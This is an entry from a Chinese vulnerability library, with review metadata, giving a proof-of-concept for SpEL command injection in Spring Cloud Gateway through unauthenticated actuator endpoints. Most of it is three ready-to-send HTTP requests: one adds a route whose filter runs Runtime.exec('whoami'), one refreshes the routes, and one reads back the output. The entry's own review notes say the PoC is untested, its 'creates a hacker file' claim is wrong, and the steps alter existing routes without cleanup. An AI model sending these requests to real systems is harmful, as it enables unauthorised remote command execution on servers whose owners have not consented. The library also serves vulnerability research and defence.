---
source: "wy876 漏洞文库"
product: "Spring Cloud Gateway/路由SpEL"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Springbootgateway存在命令执行漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：影响写actuator未授权不是版本；需可写Gateway端点"
side_effects: "未执行；本文需注意的操作影响：路由误称文件且不恢复；poc1创建hacker文件不符实际，固定jeecg-demo可碰现有路由，无删除/再刷新"
source_status: "unknown"
id: "vw-e9dbf57c200f2fc8aaa8f1bf"
entity_id: "ve-e9dbf57c200f2fc8aaa8f1bf"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：影响写actuator未授权不是版本；需可写Gateway端点

代码与实验材料：创建刷新读取三步无响应/删除，URL id与JSON id前导斜杠不同

来源证据范围：wy876语雀

- **操作与副作用边界（1）**：路由误称文件且不恢复；依据：poc1创建hacker文件不符实际，固定jeecg-demo可碰现有路由，无删除/再刷新。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **来源与引用处置（2）**：身份/格式污染；依据：Host空、无关统计Cookie、id路径和body不一致。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Spring boot gateway存在命令执行漏洞

# 一、漏洞描述
Spring boot gateway存在命令执行漏洞

# 二、影响版本
Spring boot actuator未授权

# 三、资产测绘
```plain
/actuator/gateway/  接口存在
```


# 三、漏洞复现
1. <font style="color:rgba(0, 0, 0, 0.9);">构造poc1创建hacker文件：</font>

```plain
POST /actuator/gateway/routes/jeecg-demo HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 333

{
  "id": "/jeecg-demo",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}

```


2、刷新路由

```plain
POST /actuator/gateway/refresh HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: __51uvsct__JuHMLCp1r3cB6ggB=1; __51vcke__JuHMLCp1r3cB6ggB=8bfe73d5-e527-5232-9cbe-1f2983c556d9; __51vuft__JuHMLCp1r3cB6ggB=1681223932313
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

```


3、查看回显

```plain
GET /actuator/gateway/routes/jeecg-demo HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gl2g116gzest4e6t>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
